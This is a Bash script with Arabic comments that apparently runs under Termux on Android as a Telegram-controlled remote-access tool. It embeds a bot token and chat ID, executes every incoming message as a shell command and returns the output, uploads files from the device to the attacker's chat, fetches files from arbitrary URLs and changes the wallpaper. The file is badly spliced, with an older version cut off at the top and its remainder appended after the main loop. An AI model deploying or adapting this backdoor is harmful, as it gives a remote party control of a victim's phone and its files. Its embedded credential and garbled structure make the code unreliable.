#!/bin/bash

# تكوين البوت
TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
CHAT_ID="5967116314"
API_URL="https://api.telegram.org/bot$TOKEN"

# الحصول على آخر تحديث#!/bin/bash

#-------------------------
# تكوين البوت
#-------------------------
TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
CHAT_ID="5967116314"
API_URL="https://api.telegram.org/bot$TOKEN"
DOWNLOAD_DIR="/sdcard/TelegramDownloads"
WALLPAPER_DIR="/sdcard/Pictures"
LOG_FILE="bot_script.log"

mkdir -p "$DOWNLOAD_DIR" 2>/dev/null
touch "$LOG_FILE"

#-------------------------
# إرسال رسالة بدء التشغيل
#-------------------------
send_message() {
    local text="$1"
    curl -s -X POST "$API_URL/sendMessage" -d chat_id="$CHAT_ID" -d text="$text"
}

send_message "✅ تم تسجيل الدخول بنجاح! ✅"

#-------------------------
# دالة تنفيذ الأوامر
#-------------------------
execute_command() {
    local command="$1"
    local output
    output=$(bash -c "$command" 2>&1)
    send_message ".Executor: $command\n.Result:\n$output"
}

#-------------------------
# دالة رفع الملفات
#-------------------------
upload_file() {
    local file_path="$1"
    if [ -f "$file_path" ]; then
        curl -s "$API_URL/sendDocument" \
            -F chat_id="$CHAT_ID" \
            -F document=@"$file_path" \
            >> "$LOG_FILE" 2>&1
    else
        send_message "❌ الملف غير موجود: $file_path"
    fi
}

#-------------------------
# دالة تحميل الملفات
#-------------------------
download_file() {
    local file_url="$1"
    local file_name=$(basename "$file_url")
    local save_path="$DOWNLOAD_DIR/$file_name"
    
    if wget -O "$save_path" "$file_url" 2>/dev/null; then
        send_message "✅ تم التحميل: $save_path"
    else
        send_message "❌ فشل التحميل: $file_url"
    fi
}

#-------------------------
# دالة تغيير الخلفية
#-------------------------
set_wallpaper() {
    local image_path="$1"
    if [ -f "$image_path" ]; then
        cp "$image_path" "$WALLPAPER_DIR/wallpaper.jpg"
        termux-wallpaper -f "$WALLPAPER_DIR/wallpaper.jpg" 2>/dev/null
        send_message "✅ تم تغيير الخلفية بنجاح!"
    else
        send_message "❌ الصورة غير موجودة: $image_path"
    fi
}

#-------------------------
# الحلقة الرئيسية
#-------------------------
offset=0
while true; do
    # الحصول على التحديثات
    updates=$(curl -s "$API_URL/getUpdates?offset=$offset" | jq '.' 2>/dev/null)
    
    # تحليل الرسائل
    for row in $(echo "$updates" | jq -r '.result[] | @base64'); do
        _jq() {
            echo "$row" | base64 --decode | jq -r "$1"
        }
        
        update_id=$(_jq '.update_id')
        message=$(_jq '.message.text')
        photo=$(_jq '.message.photo[-1].file_id // empty')
        caption=$(_jq '.message.caption')
        
        # تحديث الـ offset
        offset=$((update_id + 1))
        
        # معالجة الأوامر
        if [ -n "$message" ]; then
            case "$message" in
                up\ *)
                    file=${message#up }
                    upload_file "$file" &
                    ;;
                    
                dwen\ *)
                    url=${message#dwen }
                    download_file "$url" &
                    ;;
                    
                cd\ *)
                    dir=${message#cd }
                    cd "$dir" 2>/dev/null || send_message "❌ مجلد غير موجود: $dir"
                    ;;
                    
                *)
                    execute_command "$message" &
                    ;;
            esac
        fi
        
        # معالجة الصور مع caption
        if [ -n "$photo" ] && [[ "$caption" == *"bak"* ]]; then
            file_path=$(curl -s "$API_URL/getFile?file_id=$photo" | jq -r '.result.file_path')
            image_url="https://api.telegram.org/file/bot$TOKEN/$file_path"
            download_image=$(wget -O "$WALLPAPER_DIR/temp.jpg" "$image_url" 2>/dev/null)
            set_wallpaper "$WALLPAPER_DIR/temp.jpg"
        fi
    done
    
    sleep 2
done
get_updates() {
    curl -s "$API_URL/getUpdates?offset=-1"
}

# إرسال رسالة
send_message() {
    local text="$1"
    curl -s -X POST "$API_URL/sendMessage" -d chat_id="$CHAT_ID" -d text="$text"
}

# تنفيذ الأمر وإرسال النتيجة
execute_command() {
    local command="$1"
    local output
    output=$(bash -c "$command" 2>&1)
    send_message "التنفيذ: $command\nالنتيجة:\n$output"
}

# الحلقة الرئيسية
last_update_id=""
while true; do
    updates=$(get_updates)
    current_update_id=$(echo "$updates" | grep -oP '(?<=update_id":)[0-9]+')
    
    if [ "$current_update_id" != "$last_update_id" ] && [ -n "$current_update_id" ]; then
        message=$(echo "$updates" | grep -oP '(?<=text":")[^"]+')
        execute_command "$message"
        last_update_id="$current_update_id"
    fi
    sleep 1
done
